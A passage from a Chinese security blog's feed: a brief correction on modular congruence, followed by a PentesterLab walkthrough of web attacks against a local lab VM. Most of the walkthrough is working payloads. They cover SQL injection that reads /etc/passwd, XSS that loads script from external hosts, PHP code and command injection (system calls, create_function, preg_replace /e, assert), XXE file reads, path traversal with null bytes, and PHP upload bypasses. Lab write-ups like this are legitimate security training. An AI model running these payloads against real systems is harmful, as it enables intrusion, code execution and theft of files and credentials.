    <link href="http://0x48.pw/2016/04/01/0x16/"/>
    <id>http://0x48.pw/2016/04/01/0x16/</id>
    <published>2016-04-01T11:57:39.000Z</published>
    <updated>2016-04-02T04:44:10.638Z</updated>
    <content type="html"><![CDATA[<p>关于前篇求模运算的修正<br><a id="more"></a></p>
<p>今天突然对模运算开窍了，这是上篇RSA总结中我对同余式的理解：<br><del></del></p>
<blockquote>
<p>x = y (mod n)   可以看成是   x % n = y<br>x $\equiv$ y (mod n)   可以看成是   x % n = y % n<br></p>
</blockquote>
<p><strong>是错误的！！！</strong></p>
<p>其实三等还是两等，都是一样的，比如，对于 $A\ \%\ N = B$,<br>我们可以很容易得到<br>$$x_1N + B = A$$<br>也可以是<br>$$x_2N + A = B$$<br>然后这两个式子就会给我们一个错觉推出，<br>$$x_1N + B = A  \Longrightarrow  A\ \%\ N = B\ (B = A\ (mod\ N))$$<br>$$x_2N + A = B \Longrightarrow  B\ \%\ N = A\ (A = B\ (mod\ N))$$</p>
<p><strong>看着好像没错的样子，其实错了一半！</strong></p>
<p>如果我们已知 $A\ \%\ N = B$, 我们可以推出$xN + B = A$没错，但是我们不能从而得到 <del>B % N = A</del>，可是上面推的貌似没问题？不，有问题！</p>
<p>$$xN + A = B\ \ \nRightarrow \ \ B\ \%\ N = A$$<br>这个推导是错误的！正确的应该是<br>$$xN + A = B \Longrightarrow B\ \%\ N = A\ \%\ N$$</p>
<p>这不就是同余式么: $A \equiv B(mod\ N)$</p>
<p>这里暗藏了一个等式，当我们已知$A\ \%\ N = B$ 时，我们可以确定$B = B\ \%\ N$, 所以这个时候就可以从 $xN + B = A$ 推导出 $A\ \%\ N = B$, 但是A却不一定等于$A\ \%\ N$, 所以并不能得到$B\ \%\ N = A$</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>关于前篇求模运算的修正<br>]]>
    
    </summary>
    
      <category term="密码学" scheme="http://0x48.pw/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Pentester Lab Writeup]]></title>
    <link href="http://0x48.pw/2016/03/21/0x15/"/>
    <id>http://0x48.pw/2016/03/21/0x15/</id>
    <published>2016-03-21T02:16:46.000Z</published>
    <updated>2016-03-28T10:18:37.294Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>玩了下exploit, 再来玩玩pentest。</p>
</blockquote>
<a id="more"></a>
<h1 id="SQLI">SQLI</h1><h2 id="Example_1">Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example1.php?name=admin<span class="number">%27</span><span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>version(),load_file(<span class="number">%22</span>/etc/passwd<span class="number">%22</span>),user(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2">Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">TABLES</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3">Example 3</h2><p>只能说上题的payload还能用。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example3.php?name=root%<span class="number">27</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="function">user</span>(),<span class="function">database</span>(),<span class="function">version</span>(),<span class="number">4</span>,<span class="number">5%</span><span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>去看看源码。。看看这两题的过滤有啥区别。。<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example2.php</span></span><br><span class="line"><span class="keyword">if</span> <span class="params">(preg_match<span class="params">('/ /', $_GET[<span class="string">"name"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR NO SPACE"</span>)</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//example3.php</span></span><br><span class="line"><span class="keyword">if</span> <span class="params">(preg_match<span class="params">('/\s+/', $_GET[<span class="string">"name"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR NO SPACE"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这过滤对我的payload并没有影响。。</p>
<h2 id="Example_4">Example 4</h2><p>换整型注入了。。一样。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example4.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_5">Example 5</h2><p>上题的payload还是可以用，这题的过滤是要求0-9开头<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example5.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),5,6<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_6">Example 6</h2><p>猜到了，这题是要求0-9结尾。。一样简单<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example6.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%233</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_7">Example 7</h2><p>这题看了源码。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example7.php?id=2<span class="number">%0</span>aunion<span class="number">%20</span>select<span class="number">%20</span>version(),user(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
<p>这题需要用%0a来bypass，因为。。看源码：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="params">(!preg_match<span class="params">('/^-?[<span class="number">0</span>-<span class="number">9</span>]+$/m', $_GET[<span class="string">"id"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR INTEGER REQUIRED"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>主要是最后的/m</p>
<blockquote>
<p>m (PCRE_MULTILINE)<br>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 (\$) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 \$，设置这个修饰符不产生任何影响。</p>
</blockquote>
<p>意思就是，加了一个\n后，就会有两行，只要其中一行满足正则匹配就会返回true</p>
<h2 id="Example_8">Example 8</h2><p>很明显，是在<code>order by</code>的位置注，不过就不能使用union了，所以用布尔盲注。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id`,(select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
<p>写个脚本跑这个payload就好了，有两个变量var1和var2，var1是int型表示字符串的几var1位，var2就是跑ascii码，如果页面有显示内容，则表示user()第var1字符的ascii码为var2。</p>
<p>以前写过这样的脚本，现在就懒得写了。。</p>
<h2 id="Example_9">Example 9</h2><p>和前面一个比，就是少了一个`， 其他都一样<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id, (select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="XSS">XSS</h1><h2 id="Example_1-1">Example 1</h2><p>很简单，没做过过滤的xss<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example1.php?name=hacker%<span class="number">3</span>Cscript%<span class="number">20</span>src=%<span class="number">22</span>http://xxx.xxx.xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
<p>成功弹窗</p>
<h2 id="Example_2-1">Example 2</h2><p>变个大小写就好了<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example2.php?name=hacker%<span class="number">3</span>Cscript%<span class="number">20</span>src=%<span class="number">22</span>http://xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/scriPT%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-1">Example 3</h2><p>价格空格就好了<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example3.php?name=hacker%<span class="number">3</span>CscripT%<span class="number">20</span>src=%<span class="number">22</span>http://xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/<span class="type">Script</span>%<span class="number">20</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_4-1">Example 4</h2><p>过滤了script，而且不是去掉而是出现了就直接报错，不过任然可以日。<br>payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/xss/example4.php?name=hacker<span class="number">%3</span>Csvg/onload=<span class="number">%22</span>var<span class="number">%20</span>i=String.fromCharCode(115,<span class="number">%2099</span>,<span class="number">%20114</span>,<span class="number">%20105</span>,<span class="number">%20112</span>,<span class="number">%20116</span>);s<span class="number">%20</span>=<span class="number">%20</span>createElement(i);body.appendChild(s);s.src=<span class="number">%27</span>http://xxx/template/alert.js<span class="number">%27</span>;<span class="number">%22</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_5-1">Example 5</h2><p>过滤的是alert，可惜我都不是直接用alert, 改个文件名就好了<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/xss/example5.php?name=hacker<span class="number">%3</span>Cscript<span class="number">%20</span>src=<span class="number">%22</span>http://xxx/myjs/test.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/script<span class="number">%3</span>E</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_6-1">Example 6</h2><p>这回代码是插在<code>&lt;script&gt;</code>里面, 没做啥过滤<br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example6.php?name=<span class="string">script";s=document.createElement($a);s.src="</span>http://xxx/<span class="keyword">template</span>/alert.<span class="string">js";document.getElementsByTagName( "</span><span class="string">head" )[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Exmple_7">Exmple 7</h2><p>…过滤了双引号。。不过和上题有差？<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example7.php?name=script';s=document.createElement($a);s.src='http://xxx/<span class="keyword">template</span>/alert.js';document.getElementsByTagName( 'head')[<span class="number">0</span>].appendChild(s);//</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_8-1">Example 8</h2><p>这题改成POST了，然后直接输出，把尖括号编码了。。能艹？上次SSCTF也有类似的题，可是是通过框架来日。。所以看了下源码。。<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> <span class="keyword">method</span>=<span class="string">"POST"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>好了，有了这句就能艹了。。原来不是用POST</p>
<p>payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/xss/example8.php/"&gt;<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xxx</span>/<span class="attribute">template</span>/<span class="attribute">alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_9-1">Example 9</h2><p>这题貌似看浏览器啊。。用firefox会自动帮你urlencode，用chrome成功了。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/xss/example9.php#<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.lazysheep.cc</span>/<span class="attribute">template</span>/<span class="attribute">alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="File_Include">File Include</h1><h2 id="Example_1-2">Example 1</h2><p>很简单。。没做任何过滤<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="regexp">//</span><span class="number">192.168</span>.56.102<span class="regexp">/fileincl/example1.php?page=/</span>..<span class="regexp">/../</span>../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-2">Example 2</h2><p>也简单，就是会在名字后面自动加上<code>.php</code>，用%00可以bypass<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.102/fileincl</span><span class="regexp">/example2.php?page=/etc</span><span class="regexp">/passwd%00</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Code_injection">Code injection</h1><h2 id="Example_1-3">Example 1</h2><p>入门的代码执行漏洞。。没做任何过滤。。<br>payload:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example1.php?name=<span class="variable">%22</span>;<span class="keyword">system</span>(<span class="variable">%27cat</span><span class="variable">%20</span>/etc/passwd<span class="variable">%27</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-3">Example 2</h2><p>这题也不难，搜索一下<code>php create_function 代码注入</code>，我来分析下。。源码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(<span class="variable">$users</span>, create_<span class="keyword">function</span>(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.<span class="variable">$order</span>.<span class="string">',$b-&gt;'</span>.<span class="variable">$order</span>.<span class="string">');'</span>));</span><br></pre></td></tr></table></figure></p>
<p>然后系统会拼凑一个函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">(<span class="variable">$a</span>, <span class="variable">$b</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strcmp(<span class="variable">$a</span>-&gt;<span class="variable">$order</span>, <span class="variable">$b</span>-&gt; <span class="variable">$order</span>); &#125;</span><br></pre></td></tr></table></figure></p>
<p>然后会使用eval函数，看到这里就好了。。<br>Payload：<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://<span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example2.php?order=id,<span class="variable">$b</span>-%<span class="number">3</span>Ename);</span>&#125;<span class="function">phpinfo</span>();<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>这样拼凑的函数就成了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strcmp(<span class="variable">$a</span>-&gt;id, <span class="variable">$b</span>-&gt;name);&#125;phpinfo();<span class="comment">//);&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-2">Example 3</h2><p>这题随便试下报错发现用了preg_replace，然后又是代码注入的题，自然想到了<code>\e</code>修饰符<br>Payload:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">56.101</span>/codeexec/example3.php?<span class="variable">new=</span>phpinfo()&amp;<span class="variable">pattern=</span>/lamer/e&amp;<span class="variable">base=</span>lamer</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_4-2">Example 4</h2><p><code>assert</code>的命令执行，跟<code>eval</code>用法类似，不过黑盒了半天都有问题。白盒了后<br>Payload:<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://<span class="number">192.168</span>.<span class="number">56.101</span>/codeexec/example4.php?name=%<span class="number">27</span>.<span class="function">phpinfo</span>();</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Commands_injecttion">Commands injecttion</h1><h2 id="Example_1-4">Example 1</h2><p>没做任何过滤的。。。直接就可以输入命令了。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.101</span>/commandexec/example1.php?ip=</span></span>;<span class="tag">ls</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-4">Example 2</h2><p>这种遇到的少了，还是白盒了，然后发现<code>preg_match</code>的正则有\m修饰符，就会了。。。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168.56.101</span>/commandexec/example2.php?ip=<span class="number">127.0.0.1</span>%0als</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-3">Example 3</h2><p>这题还不错。。受到前几题的影响，一直在想正则怎么绕了，研究了半天，发现正则写的没问题，根本绕过不<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match('/^<span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="formula">$/', $</span>_GET<span class="special">[</span>'ip'<span class="special">]</span>)</span><br></pre></td></tr></table></figure></p>
<p>看了LL的wp后在注意到，header后竟然没有exit，这就跟没过滤一样了，这类的题目以前遇到过。。<br>Payload:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v "http://<span class="number">192.168.56.101</span>/commandexec/example3.php?ip=<span class="number">127.0.0.1</span><span class="comment">;ls"</span></span><br></pre></td></tr></table></figure></p>
<h1 id="XML_attacks">XML attacks</h1><p>这部分是XXE注入，XML Entity Injection, XML不是特别了解，参考文档<a href="https://www.91ri.org/9539.html" target="_blank" rel="external">https://www.91ri.org/9539.html</a></p>
<h2 id="Example_1-5">Example 1</h2><p>根据文档中的例子，自己试了试，把能删的都删了，剩下必须的部分：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span>/xml/example1.php?xml=<span class="variable">%3C</span><span class="variable">%21DOCTYPE</span><span class="variable">%20h</span><span class="variable">%20</span><span class="variable">%5B</span><span class="variable">%3C</span><span class="variable">%21ENTITY</span><span class="variable">%20pen</span><span class="variable">%20SYSTEM</span><span class="variable">%20</span><span class="variable">%22file</span><span class="variable">%3A</span><span class="variable">%2f</span><span class="variable">%2f</span><span class="variable">%2fetc</span><span class="variable">%2fpasswd</span><span class="variable">%22</span><span class="variable">%20</span><span class="variable">%3E</span><span class="variable">%5D</span><span class="variable">%3E</span><span class="variable">%3Ctext</span><span class="variable">%3E</span><span class="variable">%26pen</span><span class="variable">%3B</span><span class="variable">%3C</span><span class="variable">%2ftext</span><span class="variable">%3E</span></span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM <span class="string">"file:///etc/passwd"</span> &gt;]&gt;&lt;text&gt;&amp;pen;&lt;<span class="regexp">/text&gt;</span><br><span class="line">http:/</span><span class="regexp">/192.168.56.101/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20h%20%5B%3C%21ENTITY%20pen%20SYSTEM%20%22php%3A%2f%2ffilter%2fread%3Dconvert.base64-encode%2fresource%3Dexample1.php%22%20%3E%5D%3E%3Ctext%3E%26pen%3B%3C%2ftext%3E</span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM "php:/</span><span class="regexp">/filter/read</span>=convert.base64-encode/resource=example1.php<span class="string">" &gt;]&gt;&lt;text&gt;&amp;pen;&lt;/text&gt;</span><br><span class="line">http://192.168.56.101/xml/example1.php?xml=<span class="variable">%3C</span><span class="variable">%21DOCTYPE</span><span class="variable">%20h</span><span class="variable">%20</span><span class="variable">%5B</span><span class="variable">%3C</span><span class="variable">%21ENTITY</span><span class="variable">%20pen</span><span class="variable">%20SYSTEM</span><span class="variable">%20</span><span class="variable">%22http</span>:/<span class="variable">%2f127</span>.0.0.1<span class="variable">%22</span><span class="variable">%20</span><span class="variable">%3E</span><span class="variable">%5D</span><span class="variable">%3E</span><span class="variable">%3Ctext</span><span class="variable">%3E</span><span class="variable">%26pen</span><span class="variable">%3B</span><span class="variable">%3C</span><span class="variable">%2ftext</span><span class="variable">%3E</span></span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM "</span>http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="string">" &gt;]&gt;&lt;text&gt;&amp;pen;&lt;/text&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>SYSTEM之后的参数可以如下协议：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">file:</span><span class="comment">//</span></span><br><span class="line"><span class="string">http:</span><span class="comment">//</span></span><br><span class="line"><span class="string">php:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-5">Example 2</h2><p>这个是XML Injection，以前做过，也写过wp，<a href="http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100" target="_blank" rel="external">http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100</a><br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.101/xml/example2.php?name=hacker<span class="number">%27</span><span class="number">%5</span>D<span class="number">%20</span><span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%5</span>B<span class="number">%27</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Directory_traversal">Directory traversal</h1><h2 id="Example_1-6">Example 1</h2><p>打开来看啥也没有。。不明所以，看了下源码，是没做任何过滤的任意文件读取，，<br>Payload:<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="regexp">//</span><span class="number">192.168</span>.56.101<span class="regexp">/dirtrav/example1.php?file=../</span>..<span class="regexp">/../</span>../etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_2-6">Example 2</h2><p>也不难。。。几乎也跟没过滤一样<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.101/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2 id="Example_3-4">Example 3</h2><p>这题的这正则有跟没有一样。。。不能匹配到结尾的<code>\x00</code><br>Payload:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.101/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<h1 id="File_Upload">File Upload</h1><h2 id="Example_1-7">Example 1</h2><p>同样是没做过滤。。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo "<span class="php"><span class="preprocessor">&lt;?php</span> phpinfo();<span class="preprocessor">?&gt;</span></span>" &gt; /tmp/test.php</span><br></pre></td></tr></table></figure></p>
<p>把 <code>/tmp/test.php</code> 上传上去，然后可以直接访问。。同样可以写一句话getshell</p>
<h2 id="Example_2-7">Example 2</h2><p>这题过滤了php结尾的文件。。。然后php3 bypass后可成功执行</p>
]]></content>
    <summary type="html">
